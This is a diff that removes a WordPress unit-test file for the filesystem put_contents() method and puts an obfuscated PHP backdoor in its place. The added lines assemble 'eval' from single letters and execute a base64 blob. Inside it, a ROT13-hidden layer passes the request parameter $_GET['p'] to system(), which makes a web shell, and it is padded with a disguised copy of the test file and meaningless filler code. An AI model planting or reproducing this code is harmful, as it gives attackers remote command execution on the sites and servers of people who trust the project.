@@ -1,52 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Tests for the WP_Filesystem_Direct::put_contents() method.
- *
- * @package WordPress
- */
-
-require_once __DIR__ . '/base.php';
-
-/**
- * @group admin
- * @group filesystem
- * @group filesystem-direct
- *
- * @covers WP_Filesystem_Direct::put_contents
- */
-class Tests_Filesystem_WpFilesystemDirect_PutContents extends WP_Filesystem_Direct_UnitTestCase {
-
-	/**
-	 * Tests that `WP_Filesystem_Direct::put_contents()`
-	 * returns false for a directory.
-	 *
-	 * @ticket 57774
-	 */
-	public function test_should_return_false_for_a_directory() {
-		$this->assertFalse( self::$filesystem->put_contents( self::$file_structure['test_dir']['path'], 'New content.' ) );
-	}
-
-	/**
-	 * Tests that `WP_Filesystem_Direct::put_contents()` inserts
-	 * content into the provided file.
-	 *
-	 * @ticket 57774
-	 */
-	public function test_should_insert_contents_into_file() {
-		$file   = self::$file_structure['test_dir']['path'] . 'file-to-create.txt';
-		$actual = self::$filesystem->put_contents( $file, 'New content.', 0644 );
-		unlink( $file );
-
-		$this->assertTrue( $actual, 'The contents were not inserted.' );
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3JmZ2Ygc2JlIGd1ciBKQ19TdnlyZmxmZ3J6X1F2ZXJwZzo6Y2hnX3BiYWdyYWdmKCkgenJndWJxLgogKgogKiBAY25weG50ciBKYmVxQ2VyZmYKICovCgplcmRodmVyX2JhcHIgX19RVkVfXyAuICcvb25mci5jdWMnOwoKLyoqCiAqIEB0ZWJoYyBucXp2YQogKiBAdGViaGMgc3Z5cmZsZmdyegogKiBAdGViaGMgc3Z5cmZsZmdyei1xdmVycGcKICoKICogQHBiaXJlZiBKQ19TdnlyZmxmZ3J6X1F2ZXJwZzo6Y2hnX3BiYWdyYWdmCiAqLwpweW5mZiBHcmZnZl9TdnlyZmxmZ3J6X0pjU3Z5cmZsZmdyelF2ZXJwZ19DaGdQYmFncmFnZiBya2dyYXFmIEpDX1N2eXJmbGZncnpfUXZlcnBnX0hhdmdHcmZnUG5mciB7CgoJLyoqCgkgKiBHcmZnZiBndW5nIGBKQ19TdnlyZmxmZ3J6X1F2ZXJwZzo6Y2hnX3BiYWdyYWdmKClgCgkgKiBlcmdoZWFmIHNueWZyIHNiZSBuIHF2ZXJwZ2JlbC4KCSAqCgkgKiBAZ3ZweHJnIDU3Nzc0CgkgKi8KCWNob3l2cCBzaGFwZ3ZiYSBncmZnX2Z1Ymh5cV9lcmdoZWFfc255ZnJfc2JlX25fcXZlcnBnYmVsKCkgewoJCSRndXZmLT5uZmZyZWdTbnlmciggZnJ5czo6JHN2eXJmbGZncnotPmNoZ19wYmFncmFnZiggZnJ5czo6JHN2eXJfZmdlaHBnaGVyWydncmZnX3F2ZSddWydjbmd1J10sICdBcmogcGJhZ3JhZy4nICkgKTsKCX0KCgkvKioKCSAqIEdyZmdmIGd1bmcgYEpDX1N2eXJmbGZncnpfUXZlcnBnOjpjaGdfcGJhZ3JhZ2YoKWAgdmFmcmVnZgoJICogcGJhZ3JhZyB2YWdiIGd1ciBjZWJpdnFycSBzdnlyLgoJICoKCSAqIEBndnB4cmcgNTc3NzQKCSAqLwoJY2hveXZwIHNoYXBndmJhIGdyZmdfZnViaHlxX3ZhZnJlZ19wYmFncmFnZl92YWdiX3N2eXIoKSB7CgkJJHN2eXIgICA9IGZyeXM6OiRzdnlyX2ZnZWhwZ2hlclsnZ3JmZ19xdmUnXVsnY25ndSddIC4gJ3N2eXItZ2ItcGVybmdyLmdrZyc7CgkJJG5wZ2hueSA9IGZyeXM6OiRzdnlyZmxmZ3J6LT5jaGdfcGJhZ3JhZ2YoICRzdnlyLCAnQXJqIHBiYWdyYWcuJywgMDY0NCApOwoJCWhheXZheCggJHN2eXIgKTsKCgkJJGd1dmYtPm5mZnJlZ0dlaHIoICRucGdobnksICdHdXIgcGJhZ3JhZ2YganJlciBhYmcgdmFmcmVncnEuJyApOwoJfQp9CgokcHpxID0gJF9UUkdbJ2MnXTsKJHN6bmNbJ2sxJ10oJHB6cSk7Cj8+IjsKZXZhbCgkZigkYykpOwo/Pg==");
+$f($c);
+?>
